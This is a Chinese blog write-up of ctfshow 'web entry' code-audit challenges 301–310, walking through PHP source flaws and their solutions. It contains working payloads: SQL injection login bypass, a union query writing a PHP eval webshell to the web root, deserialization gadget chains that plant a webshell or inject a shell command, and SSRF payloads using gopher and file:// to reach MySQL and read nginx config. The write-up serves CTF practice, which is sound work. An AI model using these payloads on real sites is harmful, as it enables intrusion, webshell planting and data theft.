---
title: ctfshow web入门(代码审计)
categories: ctfshow
---
# 301
下载源码看到对username没有防护，存在sql注入，且知道了表名与列名
```php
$sql="select sds_password from sds_user where sds_username='".$username."' order by id limit 1;";
$result=$mysqli->query($sql);
$row=$result->fetch_array(MYSQLI_BOTH);
if($result->num_rows<1){
	$_SESSION['error']="1";
	header("location:login.php");
	return;
}
if(!strcasecmp($userpwd,$row['sds_password'])){
	$_SESSION['login']=1;
	$result->free();
	$mysqli->close();
	header("location:index.php");
	return;
}
```
Sqlmap跑一下：

<!--more-->

![](https://img-blog.csdnimg.cn/20210413215355857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
让查出的内容和post传的密码相等：
用户输入一个用户名，去数据库查对应的密码，再与用户输入的密码进行对比

那么我们 union select 的 1(可以想象成对应的sds_password)与我们传的密码 1 比对，返回 `true`，union注入：
```
' union select 1#
1
```
也可以尝试写入一句话

> 'union select "<?php eval($_POST[shell]);?>" into outfile "/var/www/html/shell.php"%23


---
# 302

修改的地方：
>if(!strcasecmp(sds_decode(\$userpwd),$row['sds_password']

```php
<?php
function sds_decode($str){
	return md5(md5($str.md5(base64_encode("sds")))."sds");
}
?>
```
就是将用户输入的密码进行decode方法

Payload：
```php
<?php

$str="1";
$a=md5(md5($str.md5(base64_encode("sds")))."sds");
echo $a;

?>
```
> ' union select 'd9c77c4e454869d5d8da3b4be79694d3'%23&userpwd=1


---
# 303-304
admin,admin登录

![](https://img-blog.csdnimg.cn/20210413223046206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
闭合第一个单引号，`伪造 address` 进行注入
```
1',sds_address =(select group_concat(table_name) from information_schema.tables where table_schema=database())#
```
![](https://img-blog.csdnimg.cn/20210413223132852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210413223139236.png#pic_center)

---
# 305
看到对每个参数都有waf

![](https://img-blog.csdnimg.cn/20210413223211361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
waf:

![](https://img-blog.csdnimg.cn/20210413223223991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Sql不可能了

Class.php存在危险函数：

![](https://img-blog.csdnimg.cn/20210413223240257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
存在反序列化：

![](https://img-blog.csdnimg.cn/20210413223254751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
一句话反序列化编码一下：

![](https://img-blog.csdnimg.cn/20210413223355688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
蚁剑连接数据库：

![](https://img-blog.csdnimg.cn/20210413223425949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210413223437762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 306
admin
admin1

看到 class.php 中的 log 类中 close 方法有危险函数

![](https://img-blog.csdnimg.cn/2021041322354028.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
发现 dao.php 的 destruct 调用 class.php 且调用close方法：

这里需要在 `_construct中，让log初始化`，然后这样才能在`_destruct中调用 log 的 close 方法`

![](https://img-blog.csdnimg.cn/20210413223859480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
在index.php中调用dao.php且存在反序列化,所以在index.php触发反序列化

index.php -- dao.php -- class.php -- close()

Payload：
```php
<?php
class log{
	public $title='cys.php';
	public $info='<?php eval($_POST[shell]);?>';
}
class dao{	
	private $conn;
	public function __construct(){
		$this->conn=new log();
	}
}
echo base64_encode(serialize(new dao()));
?>
```

---
# 307
dao.php:

![](https://img-blog.csdnimg.cn/20210413224339800.png#pic_center)

service.php

![](https://img-blog.csdnimg.cn/20210413224349522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
都可调用 dao.php 中的 `clearCache` 方法

往上摸：

logout.php 调用方法

![](https://img-blog.csdnimg.cn/20210413224401314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Config.php

Cache_dir可控：

![](https://img-blog.csdnimg.cn/20210413224410153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
cache_dir可自定义 dao类中clearCache方法的参数，logout.php 再调用dao类 执行shell_exec

payload：
```php
<?php
class config{
	public $cache_dir = ';echo `cat /var/www/html/f*` > flag.txt;';  //也可以写马
}

class dao{
	private $config;
	public function __construct(){
		$this->config=new config();
	}
}
echo base64_encode(serialize(new dao()));
?>
```
![](https://img-blog.csdnimg.cn/20210413225458894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
访问地址：
URL/controller/flag.txt

![](https://img-blog.csdnimg.cn/20210413225651109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 308
过滤只能为字母：

![](https://img-blog.csdnimg.cn/20210413225735810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


Wp说在fun.php发现ssrf利用点：

![](https://img-blog.csdnimg.cn/20210413225744518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
dao.php调用

![](https://img-blog.csdnimg.cn/20210413225752361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
index.php调用方法

![](https://img-blog.csdnimg.cn/20210413225800548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
config.php

![](https://img-blog.csdnimg.cn/20210413225811866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

与上题差不多

index.php -> config.php -> dao.php

```php
<?php
class config{
	public $update_url = 'gopher://127.0.0.1:3306/……';
}
class dao{
	private $config;
	public function __construct(){
		$this->config=new config();
	}

}
$a=new dao();
echo base64_encode(serialize($a));
?>
```

具体的值通过gopherus生成
下载地址 `https://github.com/tarunkant/Gopherus`

```
3306端口为mysql默认端口
```

疑问：不需要mysql密码？可能是空的

![](https://img-blog.csdnimg.cn/20210413225942528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210413225953961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 309
需要拿shell，308的方法不行了,mysql 有密码了


既然mysql有密码了不能打，那想想也基本就剩redis和fastcgi了，拿dict探测一下，似乎没有redis，因此大概率就是`fastcgi`，但是到底如何确定存在fastcgi我也很迷。

看了一下羽师傅的方式，拿gopher协议的延时来判断：

先记下了，等ssrf再来理解

![](https://img-blog.csdnimg.cn/20210413230042607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Payload同上

---
# 310
>nginx可以通过fastcgi对接php，所以nginx的配置文件中也会有一血重要信息，此外还有端口转发等，一些重要的信息配置文件中可能都会有，

羽师傅：

9000和6379都是关着的。那我们可以试试`读下配置文件`

```php
<?php
class config{
	public $update_url = 'file:///etc/nginx/nginx.conf';
}
class dao{
	private $config;
	public function __construct(){
		$this->config=new config();
	}

}
$a=new dao();
echo base64_encode(serialize($a));
?>
```

得到：
```php
	server {
        listen       4476;
        server_name  localhost;
        root         /var/flag;
        index index.html;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
}
```

访问 4476：
```php
<?php
class config{
	public $update_url = 'http://127.0.0.1:4476';
}
class dao{
	private $config;
	public function __construct(){
		$this->config=new config();
	}
}
$a=new dao();
echo base64_encode(serialize($a));
?>
```


